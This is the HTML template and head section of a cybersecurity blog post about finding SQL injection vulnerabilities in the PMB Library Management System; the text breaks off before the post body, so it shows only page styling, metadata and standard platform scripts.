<!DOCTYPE html>
<html class='v2' dir='ltr' lang='en' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
<head>
<link href='https://www.blogger.com/static/v1/widgets/3566091532-css_bundle_v2.css' rel='stylesheet' type='text/css'/>
<meta content='width=1100' name='viewport'/>
<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
<meta content='blogger' name='generator'/>
<link href='https://nexacybersecurity.blogspot.com/favicon.ico' rel='icon' type='image/x-icon'/>
<link href='https://nexacybersecurity.blogspot.com/2024/02/journey-finding-vulnerabilities-in-pmb-library-management-system.html' rel='canonical'/>
<link rel="alternate" type="application/atom+xml" title="Nexa &#8212; Cybersecurity research - Atom" href="https://nexacybersecurity.blogspot.com/feeds/posts/default" />
<link rel="alternate" type="application/rss+xml" title="Nexa &#8212; Cybersecurity research - RSS" href="https://nexacybersecurity.blogspot.com/feeds/posts/default?alt=rss" />
<link rel="service.post" type="application/atom+xml" title="Nexa &#8212; Cybersecurity research - Atom" href="https://www.blogger.com/feeds/8777491027349637723/posts/default" />

<link rel="alternate" type="application/atom+xml" title="Nexa &#8212; Cybersecurity research - Atom" href="https://nexacybersecurity.blogspot.com/feeds/554876999792156651/comments/default" />
<!--Can't find substitution for tag [blog.ieCssRetrofitLinks]-->
<link href='https://blogger.googleusercontent.com/img/a/AVvXsEgRq8H5q_GugFUJBopwVAWs-kfZ50qKQYC86xZrrppuSDq3237JBeam3IKRaYF_IBPCCFYT_c3Yrri33XJ16gk0P7INPKfFCmjHRYN0BVyVSUCGPXrhydSi-KOj0RS519sgyNBG7TbWCOS6SNuZIlryrNxrrfsQWfx3hyD_wohAHl00RTJllSQYsDLdOx1a=w640-h118' rel='image_src'/>
<meta content='Finding vulnerabilities in the PMB Library Management System with technical details of multiple SQL Injections that lead to remote code execution.' name='description'/>
<meta content='https://nexacybersecurity.blogspot.com/2024/02/journey-finding-vulnerabilities-in-pmb-library-management-system.html' property='og:url'/>
<meta content='A Journey Into Finding Vulnerabilities in the PMB Library Management System' property='og:title'/>
<meta content='Finding vulnerabilities in the PMB Library Management System with technical details of multiple SQL Injections that lead to remote code execution.' property='og:description'/>
<meta content='https://blogger.googleusercontent.com/img/a/AVvXsEgRq8H5q_GugFUJBopwVAWs-kfZ50qKQYC86xZrrppuSDq3237JBeam3IKRaYF_IBPCCFYT_c3Yrri33XJ16gk0P7INPKfFCmjHRYN0BVyVSUCGPXrhydSi-KOj0RS519sgyNBG7TbWCOS6SNuZIlryrNxrrfsQWfx3hyD_wohAHl00RTJllSQYsDLdOx1a=w1200-h630-p-k-no-nu' property='og:image'/>
<link href='https://fonts.googleapis.com/css?family=Space Grotesk' rel='stylesheet'/>
<title>Nexa &#8212; Cybersecurity research: A Journey Into Finding Vulnerabilities in the PMB Library Management System</title>
<style id='page-skin-1' type='text/css'><!--
/*-----------------------------------------------
Blogger Template Style
Name:     Picture Window
Designer: Blogger
URL:      www.blogger.com
----------------------------------------------- */
/* Variable definitions
====================
<Variable name="keycolor" description="Main Color" type="color" default="#1a222a"/>
<Variable name="body.background" description="Body Background" type="background"
color="#111111" default="#111111 url(//themes.googleusercontent.com/image?id=1OACCYOE0-eoTRTfsBuX1NMN9nz599ufI1Jh0CggPFA_sK80AGkIr8pLtYRpNUKPmwtEa) repeat-x fixed top center"/>
<Group description="Page Text" selector="body">
<Variable name="body.font" description="Font" type="font"
default="normal normal 15px Space Grotesk, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="body.text.color" description="Text Color" type="color" default="#333333"/>
</Group>
<Group description="Backgrounds" selector=".body-fauxcolumns-outer">
<Variable name="body.background.color" description="Outer Background" type="color" default="#296695"/>
<Variable name="header.background.color" description="Header Background" type="color" default="transparent"/>
<Variable name="post.background.color" description="Post Background" type="color" default="#ffffff"/>
</Group>
<Group description="Links" selector=".main-outer">
<Variable name="link.color" description="Link Color" type="color" default="#336699"/>
<Variable name="link.visited.color" description="Visited Color" type="color" default="#6699cc"/>
<Variable name="link.hover.color" description="Hover Color" type="color" default="#33aaff"/>
</Group>
<Group description="Blog Title" selector=".header h1">
<Variable name="header.font" description="Title Font" type="font"
default="normal normal 36px Space Grotesk, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="header.text.color" description="Text Color" type="color" default="#ffffff" />
</Group>
<Group description="Tabs Text" selector=".tabs-inner .widget li a">
<Variable name="tabs.font" description="Font" type="font"
default="normal normal 15px Space Grotesk, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="tabs.text.color" description="Text Color" type="color" default="#ffffff"/>
<Variable name="tabs.selected.text.color" description="Selected Color" type="color" default="#007878"/>
</Group>
<Group description="Tabs Background" selector=".tabs-outer .PageList">
<Variable name="tabs.background.color" description="Background Color" type="color" default="transparent"/>
<Variable name="tabs.selected.background.color" description="Selected Color" type="color" default="transparent"/>
<Variable name="tabs.separator.color" description="Separator Color" type="color" default="transparent"/>
</Group>
<Group description="Post Title" selector="h3.post-title, .comments h4">
<Variable name="post.title.font" description="Title Font" type="font"
default="normal normal 18px Space Grotesk, Tahoma, Helvetica, FreeSans, sans-serif"/>
</Group>
<Group description="Date Header" selector=".date-header">
<Variable name="date.header.color" description="Text Color" type="color" default="#333333"/>
</Group>
<Group description="Post" selector=".post">
<Variable name="post.footer.text.color" description="Footer Text Color" type="color" default="#999999"/>
<Variable name="post.border.color" description="Border Color" type="color" default="#dddddd"/>
</Group>
<Group description="Gadgets" selector="h2">
<Variable name="widget.title.font" description="Title Font" type="font"
default="bold normal 13px Space Grotesk, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="widget.title.text.color" description="Title Color" type="color" default="#888888"/>
</Group>
<Group description="Footer" selector=".footer-outer">
<Variable name="footer.text.color" description="Text Color" type="color" default="#cccccc"/>
<Variable name="footer.widget.title.text.color" description="Gadget Title Color" type="color" default="#aaaaaa"/>
</Group>
<Group description="Footer Links" selector=".footer-outer">
<Variable name="footer.link.color" description="Link Color" type="color" default="#99ccee"/>
<Variable name="footer.link.visited.color" description="Visited Color" type="color" default="#77aaee"/>
<Variable name="footer.link.hover.color" description="Hover Color" type="color" default="#33aaff"/>
</Group>
<Variable name="content.margin" description="Content Margin Top" type="length" default="20px" min="0" max="100px"/>
<Variable name="content.padding" description="Content Padding" type="length" default="0" min="0" max="100px"/>
<Variable name="content.background" description="Content Background" type="background"
default="transparent none repeat scroll top left"/>
<Variable name="content.border.radius" description="Content Border Radius" type="length" default="0" min="0" max="100px"/>
<Variable name="content.shadow.spread" description="Content Shadow Spread" type="length" default="0" min="0" max="100px"/>
<Variable name="header.padding" description="Header Padding" type="length" default="0" min="0" max="100px"/>
<Variable name="header.background.gradient" description="Header Gradient" type="url"
default="none"/>
<Variable name="header.border.radius" description="Header Border Radius" type="length" default="0" min="0" max="100px"/>
<Variable name="main.border.radius.top" description="Main Border Radius" type="length" default="20px" min="0" max="100px"/>
<Variable name="footer.border.radius.top" description="Footer Border Radius Top" type="length" default="0" min="0" max="100px"/>
<Variable name="footer.border.radius.bottom" description="Footer Border Radius Bottom" type="length" default="20px" min="0" max="100px"/>
<Variable name="region.shadow.spread" description="Main and Footer Shadow Spread" type="length" default="3px" min="0" max="100px"/>
<Variable name="region.shadow.offset" description="Main and Footer Shadow Offset" type="length" default="1px" min="-50px" max="50px"/>
<Variable name="tabs.background.gradient" description="Tab Background Gradient" type="url" default="none"/>
<Variable name="tab.selected.background.gradient" description="Selected Tab Background" type="url"
default="url(https://resources.blogblog.com/blogblog/data/1kt/transparent/white80.png)"/>
<Variable name="tab.background" description="Tab Background" type="background"
default="transparent url(https://resources.blogblog.com/blogblog/data/1kt/transparent/black50.png) repeat scroll top left"/>
<Variable name="tab.border.radius" description="Tab Border Radius" type="length" default="10px" min="0" max="100px"/>
<Variable name="tab.first.border.radius" description="First Tab Border Radius" type="length" default="10px" min="0" max="100px"/>
<Variable name="tabs.border.radius" description="Tabs Border Radius" type="length" default="0" min="0" max="100px"/>
<Variable name="tabs.spacing" description="Tab Spacing" type="length" default=".25em" min="0" max="10em"/>
<Variable name="tabs.margin.bottom" description="Tab Margin Bottom" type="length" default="0" min="0" max="100px"/>
<Variable name="tabs.margin.sides" description="Tab Margin Sides" type="length" default="20px" min="0" max="100px"/>
<Variable name="main.background" description="Main Background" type="background"
default="transparent url(https://resources.blogblog.com/blogblog/data/1kt/transparent/white80.png) repeat scroll top left"/>
<Variable name="main.padding.sides" description="Main Padding Sides" type="length" default="20px" min="0" max="100px"/>
<Variable name="footer.background" description="Footer Background" type="background"
default="transparent url(https://resources.blogblog.com/blogblog/data/1kt/transparent/black50.png) repeat scroll top left"/>
<Variable name="post.margin.sides" description="Post Margin Sides" type="length" default="-20px" min="-50px" max="50px"/>
<Variable name="post.border.radius" description="Post Border Radius" type="length" default="5px" min="0" max="100px"/>
<Variable name="widget.title.text.transform" description="Widget Title Text Transform" type="string" default="uppercase"/>
<Variable name="mobile.background.overlay" description="Mobile Background Overlay" type="string"
default="transparent none repeat scroll top left"/>
<Variable name="startSide" description="Side where text starts in blog language" type="automatic" default="left"/>
<Variable name="endSide" description="Side where text ends in blog language" type="automatic" default="right"/>
*/
/* Content
----------------------------------------------- */
body {
font: normal normal 15px Space Grotesk, Tahoma, Helvetica, FreeSans, sans-serif;
color: #333333;
background: #111111 url(https://blogger.googleusercontent.com/img/a/AVvXsEgTbJjwsbkSy9r4U6mToQwMWn_uWpAyYgBQlac6UtfDnLW-ro9kuhmCzHYYoHlUEjQlrWrPbPXBCGGgt7AXhvCjRv9PKOggfg7qb_o1boMh65YoIERA3waA5qhKn28WicVgPzT72X6OVgUtAnVvzTrRplZdw7u4MtSwMKGZkrVVezpbM11-33DwLe3NCb24=s1600) repeat scroll top left;
}
html body .region-inner {
min-width: 0;
max-width: 100%;
width: auto;
}
.content-outer {
font-size: 90%;
}
a:link {
text-decoration:none;
color: #007878;
}
a:visited {
text-decoration:none;
color: #007878;
}
a:hover {
text-decoration:underline;
color: #007878;
}
.content-outer {
background: transparent none repeat scroll top left;
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
box-shadow: 0 0 0 rgba(0, 0, 0, .15);
margin: 20px auto;
}
.content-inner {
padding: 0;
}
/* Header
----------------------------------------------- */
.header-outer {
background: transparent none repeat-x scroll top left;
_background-image: none;
color: #000000;
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
}
.Header img, .Header #header-inner {
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
}
.header-inner .Header .titlewrapper,
.header-inner .Header .descriptionwrapper {
padding-left: 0;
padding-right: 0;
}
.Header h1 {
font: normal normal 36px Space Grotesk, Tahoma, Helvetica, FreeSans, sans-serif;
text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
}
.Header h1 a {
color: #000000;
}
.Header .description {
font-size: 130%;
}
/* Tabs
----------------------------------------------- */
.tabs-inner {
margin: .5em 20px 0;
padding: 0;
}
.tabs-inner .section {
margin: 0;
}
.tabs-inner .widget ul {
padding: 0;
background: #000000 none repeat scroll bottom;
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
}
.tabs-inner .widget li {
border: none;
}
.tabs-inner .widget li a {
display: inline-block;
padding: .5em 1em;
margin-right: .25em;
color: #ffffff;
font: normal normal 15px Space Grotesk, Tahoma, Helvetica, FreeSans, sans-serif;
-moz-border-radius: 10px 10px 0 0;
-webkit-border-top-left-radius: 10px;
-webkit-border-top-right-radius: 10px;
-goog-ms-border-radius: 10px 10px 0 0;
border-radius: 10px 10px 0 0;
background: transparent url(https://resources.blogblog.com/blogblog/data/1kt/transparent/black50.png) repeat scroll top left;
border-right: 1px solid #000000;
}
.tabs-inner .widget li:first-child a {
padding-left: 1.25em;
-moz-border-radius-topleft: 10px;
-moz-border-radius-bottomleft: 0;
-webkit-border-top-left-radius: 10px;
-webkit-border-bottom-left-radius: 0;
-goog-ms-border-top-left-radius: 10px;
-goog-ms-border-bottom-left-radius: 0;
border-top-left-radius: 10px;
border-bottom-left-radius: 0;
}
.tabs-inner .widget li.selected a,
.tabs-inner .widget li a:hover {
position: relative;
z-index: 1;
background: #000000 url(https://resources.blogblog.com/blogblog/data/1kt/transparent/white80.png) repeat scroll bottom;
color: #336699;
-moz-box-shadow: 0 0 3px rgba(0, 0, 0, .15);
-webkit-box-shadow: 0 0 3px rgba(0, 0, 0, .15);
-goog-ms-box-shadow: 0 0 3px rgba(0, 0, 0, .15);
box-shadow: 0 0 3px rgba(0, 0, 0, .15);
}
/* Headings
----------------------------------------------- */
h2 {
font: bold normal 13px Space Grotesk, Tahoma, Helvetica, FreeSans, sans-serif;
text-transform: uppercase;
color: #888888;
margin: .5em 0;
}
/* Main
----------------------------------------------- */
.main-outer {
background: transparent url(https://resources.blogblog.com/blogblog/data/1kt/transparent/white80.png) repeat scroll top left;
-moz-border-radius: 20px 20px 0 0;
-webkit-border-top-left-radius: 20px;
-webkit-border-top-right-radius: 20px;
-webkit-border-bottom-left-radius: 0;
-webkit-border-bottom-right-radius: 0;
-goog-ms-border-radius: 20px 20px 0 0;
border-radius: 20px 20px 0 0;
-moz-box-shadow: 0 1px 3px rgba(0, 0, 0, .15);
-webkit-box-shadow: 0 1px 3px rgba(0, 0, 0, .15);
-goog-ms-box-shadow: 0 1px 3px rgba(0, 0, 0, .15);
box-shadow: 0 1px 3px rgba(0, 0, 0, .15);
}
.main-inner {
padding: 15px 20px 20px;
}
.main-inner .column-center-inner {
padding: 0 0;
}
.main-inner .column-left-inner {
padding-left: 0;
}
.main-inner .column-right-inner {
padding-right: 0;
}
/* Posts
----------------------------------------------- */
h3.post-title {
margin: 0;
font: normal normal 32px Space Grotesk, Tahoma, Helvetica, FreeSans, sans-serif;
}
.comments h4 {
margin: 1em 0 0;
font: normal normal 32px Space Grotesk, Tahoma, Helvetica, FreeSans, sans-serif;
}
.date-header span {
color: #333333;
}
.post-outer {
background-color: #ffffff;
border: solid 1px #dddddd;
-moz-border-radius: 5px;
-webkit-border-radius: 5px;
border-radius: 5px;
-goog-ms-border-radius: 5px;
padding: 15px 20px;
margin: 0 -20px 20px;
}
.post-body {
line-height: 1.4;
font-size: 110%;
position: relative;
}
.post-header {
margin: 0 0 1.5em;
color: #999999;
line-height: 1.6;
}
.post-footer {
margin: .5em 0 0;
color: #999999;
line-height: 1.6;
}
#blog-pager {
font-size: 140%
}
#comments .comment-author {
padding-top: 1.5em;
border-top: dashed 1px #ccc;
border-top: dashed 1px rgba(128, 128, 128, .5);
background-position: 0 1.5em;
}
#comments .comment-author:first-child {
padding-top: 0;
border-top: none;
}
.avatar-image-container {
margin: .2em 0 0;
}
/* Comments
----------------------------------------------- */
.comments .comments-content .icon.blog-author {
background-repeat: no-repeat;
background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEgAACxIB0t1+/AAAAAd0SU1FB9sLFwMeCjjhcOMAAAD+SURBVDjLtZSvTgNBEIe/WRRnm3U8RC1neQdsm1zSBIU9VVF1FkUguQQsD9ITmD7ECZIJSE4OZo9stoVjC/zc7ky+zH9hXwVwDpTAWWLrgS3QAe8AZgaAJI5zYAmc8r0G4AHYHQKVwII8PZrZFsBFkeRCABYiMh9BRUhnSkPTNCtVXYXURi1FpBDgArj8QU1eVXUzfnjv7yP7kwu1mYrkWlU33vs1QNu2qU8pwN0UpKoqokjWwCztrMuBhEhmh8bD5UDqur75asbcX0BGUB9/HAMB+r32hznJgXy2v0sGLBcyAJ1EK3LFcbo1s91JeLwAbwGYu7TP/3ZGfnXYPgAVNngtqatUNgAAAABJRU5ErkJggg==);
}
.comments .comments-content .loadmore a {
border-top: 1px solid #007878;
border-bottom: 1px solid #007878;
}
.comments .continue {
border-top: 2px solid #007878;
}
/* Widgets
----------------------------------------------- */
.widget ul, .widget #ArchiveList ul.flat {
padding: 0;
list-style: none;
}
.widget ul li, .widget #ArchiveList ul.flat li {
border-top: dashed 1px #ccc;
border-top: dashed 1px rgba(128, 128, 128, .5);
}
.widget ul li:first-child, .widget #ArchiveList ul.flat li:first-child {
border-top: none;
}
.widget .post-body ul {
list-style: disc;
}
.widget .post-body ul li {
border: none;
}
/* Footer
----------------------------------------------- */
.footer-outer {
color:#cccccc;
background: transparent url(https://resources.blogblog.com/blogblog/data/1kt/transparent/black50.png) repeat scroll top left;
-moz-border-radius: 0 0 20px 20px;
-webkit-border-top-left-radius: 0;
-webkit-border-top-right-radius: 0;
-webkit-border-bottom-left-radius: 20px;
-webkit-border-bottom-right-radius: 20px;
-goog-ms-border-radius: 0 0 20px 20px;
border-radius: 0 0 20px 20px;
-moz-box-shadow: 0 1px 3px rgba(0, 0, 0, .15);
-webkit-box-shadow: 0 1px 3px rgba(0, 0, 0, .15);
-goog-ms-box-shadow: 0 1px 3px rgba(0, 0, 0, .15);
box-shadow: 0 1px 3px rgba(0, 0, 0, .15);
}
.footer-inner {
padding: 10px 20px 20px;
}
.footer-outer a {
color: #99ccee;
}
.footer-outer a:visited {
color: #77aaee;
}
.footer-outer a:hover {
color: #33aaff;
}
.footer-outer .widget h2 {
color: #aaaaaa;
}
/* Mobile
----------------------------------------------- */
html body.mobile {
height: auto;
}
html body.mobile {
min-height: 480px;
background-size: 100% auto;
}
.mobile .body-fauxcolumn-outer {
background: transparent none repeat scroll top left;
}
html .mobile .mobile-date-outer, html .mobile .blog-pager {
border-bottom: none;
background: transparent url(https://resources.blogblog.com/blogblog/data/1kt/transparent/white80.png) repeat scroll top left;
margin-bottom: 10px;
}
.mobile .date-outer {
background: transparent url(https://resources.blogblog.com/blogblog/data/1kt/transparent/white80.png) repeat scroll top left;
}
.mobile .header-outer, .mobile .main-outer,
.mobile .post-outer, .mobile .footer-outer {
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
}
.mobile .content-outer,
.mobile .main-outer,
.mobile .post-outer {
background: inherit;
border: none;
}
.mobile .content-outer {
font-size: 100%;
}
.mobile-link-button {
background-color: #007878;
}
.mobile-link-button a:link, .mobile-link-button a:visited {
color: #ffffff;
}
.mobile-index-contents {
color: #333333;
}
.mobile .tabs-inner .PageList .widget-content {
background: #000000 url(https://resources.blogblog.com/blogblog/data/1kt/transparent/white80.png) repeat scroll bottom;
color: #336699;
}
.mobile .tabs-inner .PageList .widget-content .pagelist-arrow {
border-left: 1px solid #000000;
}

--></style>
<style id='template-skin-1' type='text/css'><!--
body {
min-width: 1337px;
}
.content-outer, .content-fauxcolumn-outer, .region-inner {
min-width: 1337px;
max-width: 1337px;
_width: 1337px;
}
.main-inner .columns {
padding-left: 0;
padding-right: 310px;
}
.main-inner .fauxcolumn-center-outer {
left: 0;
right: 310px;
/* IE6 does not respect left and right together */
_width: expression(this.parentNode.offsetWidth -
parseInt("0") -
parseInt("310px") + 'px');
}
.main-inner .fauxcolumn-left-outer {
width: 0;
}
.main-inner .fauxcolumn-right-outer {
width: 310px;
}
.main-inner .column-left-outer {
width: 0;
right: 100%;
margin-left: -0;
}
.main-inner .column-right-outer {
width: 310px;
margin-right: -310px;
}
#layout {
min-width: 0;
}
#layout .content-outer {
min-width: 0;
width: 800px;
}
#layout .region-inner {
min-width: 0;
width: auto;
}
body#layout div.add_widget {
padding: 8px;
}
body#layout div.add_widget a {
margin-left: 32px;
}
--></style>
<style>
    body {background-image:url(https\:\/\/blogger.googleusercontent.com\/img\/a\/AVvXsEgTbJjwsbkSy9r4U6mToQwMWn_uWpAyYgBQlac6UtfDnLW-ro9kuhmCzHYYoHlUEjQlrWrPbPXBCGGgt7AXhvCjRv9PKOggfg7qb_o1boMh65YoIERA3waA5qhKn28WicVgPzT72X6OVgUtAnVvzTrRplZdw7u4MtSwMKGZkrVVezpbM11-33DwLe3NCb24=s1600);}
    
@media (max-width: 200px) { body {background-image:url(https\:\/\/blogger.googleusercontent.com\/img\/a\/AVvXsEgTbJjwsbkSy9r4U6mToQwMWn_uWpAyYgBQlac6UtfDnLW-ro9kuhmCzHYYoHlUEjQlrWrPbPXBCGGgt7AXhvCjRv9PKOggfg7qb_o1boMh65YoIERA3waA5qhKn28WicVgPzT72X6OVgUtAnVvzTrRplZdw7u4MtSwMKGZkrVVezpbM11-33DwLe3NCb24=w200);}}
@media (max-width: 400px) and (min-width: 201px) { body {background-image:url(https\:\/\/blogger.googleusercontent.com\/img\/a\/AVvXsEgTbJjwsbkSy9r4U6mToQwMWn_uWpAyYgBQlac6UtfDnLW-ro9kuhmCzHYYoHlUEjQlrWrPbPXBCGGgt7AXhvCjRv9PKOggfg7qb_o1boMh65YoIERA3waA5qhKn28WicVgPzT72X6OVgUtAnVvzTrRplZdw7u4MtSwMKGZkrVVezpbM11-33DwLe3NCb24=w400);}}
@media (max-width: 800px) and (min-width: 401px) { body {background-image:url(https\:\/\/blogger.googleusercontent.com\/img\/a\/AVvXsEgTbJjwsbkSy9r4U6mToQwMWn_uWpAyYgBQlac6UtfDnLW-ro9kuhmCzHYYoHlUEjQlrWrPbPXBCGGgt7AXhvCjRv9PKOggfg7qb_o1boMh65YoIERA3waA5qhKn28WicVgPzT72X6OVgUtAnVvzTrRplZdw7u4MtSwMKGZkrVVezpbM11-33DwLe3NCb24=w800);}}
@media (max-width: 1200px) and (min-width: 801px) { body {background-image:url(https\:\/\/blogger.googleusercontent.com\/img\/a\/AVvXsEgTbJjwsbkSy9r4U6mToQwMWn_uWpAyYgBQlac6UtfDnLW-ro9kuhmCzHYYoHlUEjQlrWrPbPXBCGGgt7AXhvCjRv9PKOggfg7qb_o1boMh65YoIERA3waA5qhKn28WicVgPzT72X6OVgUtAnVvzTrRplZdw7u4MtSwMKGZkrVVezpbM11-33DwLe3NCb24=w1200);}}
/* Last tag covers anything over one higher than the previous max-size cap. */
@media (min-width: 1201px) { body {background-image:url(https\:\/\/blogger.googleusercontent.com\/img\/a\/AVvXsEgTbJjwsbkSy9r4U6mToQwMWn_uWpAyYgBQlac6UtfDnLW-ro9kuhmCzHYYoHlUEjQlrWrPbPXBCGGgt7AXhvCjRv9PKOggfg7qb_o1boMh65YoIERA3waA5qhKn28WicVgPzT72X6OVgUtAnVvzTrRplZdw7u4MtSwMKGZkrVVezpbM11-33DwLe3NCb24=w1600);}}
  </style>
<link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=8777491027349637723&amp;zx=6866e743-245c-4114-8f07-b97a5b54923d' media='none' onload='if(media!=&#39;all&#39;)media=&#39;all&#39;' rel='stylesheet'/><noscript><link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=8777491027349637723&amp;zx=6866e743-245c-4114-8f07-b97a5b54923d' rel='stylesheet'/></noscript>
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>

<script type="text/javascript" language="javascript">
  // Supply ads personalization default for EEA readers
  // See https://www.blogger.com/go/adspersonalization
  adsbygoogle = window.adsbygoogle || [];
  if (typeof adsbygoogle.requestNonPersonalizedAds === 'undefined') {
    adsbygoogle.requestNonPersonalizedAds = 1;
  }
</script>


<link rel="stylesheet" href="https://fonts.googleapis.com/css2?display=swap&family=Space+Grotesk"></head>
<body class='loading'>
<div class='navbar section' id='navbar' name='Navbar'><div class='widget Navbar' data-version='1' id='Navbar1'><script type="text/javascript">
    function setAttributeOnload(object, attribute, val) {
      if(window.addEventListener) {
        window.addEventListener('load',
          function(){ object[attribute] = val; }, false);
      } else {
        window.attachEvent('onload', function(){ object[attribute] = val; });
      }
    }
  </script>
<div id="navbar-iframe-container"></div>
<script type="text/javascript" src="https://apis.google.com/js/platform.js"></script>
<script type="text/javascript">
      gapi.load("gapi.iframes:gapi.iframes.style.bubble", function() {
        if (gapi.iframes && gapi.iframes.getContext) {
          gapi.iframes.getContext().openChild({
              url: 'https://www.blogger.com/navbar.g?targetBlogID\x3d8777491027349637723\x26blogName\x3dNexa+%E2%80%94+Cybersecurity+research\x26publishMode\x3dPUBLISH_MODE_BLOGSPOT\x26navbarType\x3dLIGHT\x26layoutType\x3dLAYOUTS\x26searchRoot\x3dhttps://nexacybersecurity.blogspot.com/search\x26blogLocale\x3den\x26v\x3d2\x26homepageUrl\x3dhttps://nexacybersecurity.blogspot.com/\x26targetPostID\x3d554876999792156651\x26blogPostOrPageUrl\x3dhttps://nexacybersecurity.blogspot.com/2024/02/journey-finding-vulnerabilities-in-pmb-library-management-system.html\x26vt\x3d6618220687242131473',
              where: document.getElementById("navbar-iframe-container"),
              id: "navbar-iframe",
              messageHandlersFilter: gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER,
              messageHandlers: {
                'blogger-ping': function() {}
              }
          });
        }
      });
    </script><script type="text/javascript">
(function() {
var script = document.createElement('script');
script.type = 'text/javascript';
script.src = '//pagead2.googlesyndication.com/pagead/js/google_top_exp.js';
var head = document.getElementsByTagName('head')[0];
if (head) {
head.appendChild(script);
}})();
</script>
</div></div>
<div class='body-fauxcolumns'>
<div class='fauxcolumn-outer body-fauxcolumn-outer'>
<div class='cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</div>
<div class='content'>
<div class='content-fauxcolumns'>
<div class='fauxcolumn-outer content-fauxcolumn-outer'>
<div class='cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</div>
<div class='content-outer'>
<div class='content-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left content-fauxborder-left'>
<div class='fauxborder-right content-fauxborder-right'></div>
<div class='content-inner'>
<header>
<div class='header-outer'>
<div class='header-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left header-fauxborder-left'>
<div class='fauxborder-right header-fauxborder-right'></div>
<div class='region-inner header-inner'>
<div class='header section' id='header' name='Header'><div class='widget Header' data-version='1' id='Header1'>
<div id='header-inner'>
<div class='titlewrapper'>
<h1 class='title'>
<a href='https://nexacybersecurity.blogspot.com/'>
Nexa &#8212; Cybersecurity research
</a>
</h1>
</div>
<div class='descriptionwrapper'>
<p class='description'><span>
</span></p>
</div>
</div>
</div></div>
</div>
</div>
<div class='header-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</header>
<div class='tabs-outer'>
<div class='tabs-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left tabs-fauxborder-left'>
<div class='fauxborder-right tabs-fauxborder-right'></div>
<div class='region-inner tabs-inner'>
<div class='tabs no-items section' id='crosscol' name='Cross-Column'></div>
<div class='tabs no-items section' id='crosscol-overflow' name='Cross-Column 2'></div>
</div>
</div>
<div class='tabs-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<div class='main-outer'>
<div class='main-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left main-fauxborder-left'>
<div class='fauxborder-right main-fauxborder-right'></div>
<div class='region-inner main-inner'>
<div class='columns fauxcolumns'>
<div class='fauxcolumn-outer fauxcolumn-center-outer'>
<div class='cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<div class='fauxcolumn-outer fauxcolumn-left-outer'>
<div class='cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<div class='fauxcolumn-outer fauxcolumn-right-outer'>
<div class='cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<!-- corrects IE6 width calculation -->
<div class='columns-inner'>
<div class='column-center-outer'>
<div class='column-center-inner'>
<div class='main section' id='main' name='Main'><div class='widget Blog' data-version='1' id='Blog1'>
<div class='blog-posts hfeed'>

          <div class="date-outer">
        
<h2 class='date-header'><span>Friday, February 9, 2024</span></h2>

          <div class="date-posts">
        
<div class='post-outer'>
<div class='post hentry uncustomized-post-template' itemprop='blogPost' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
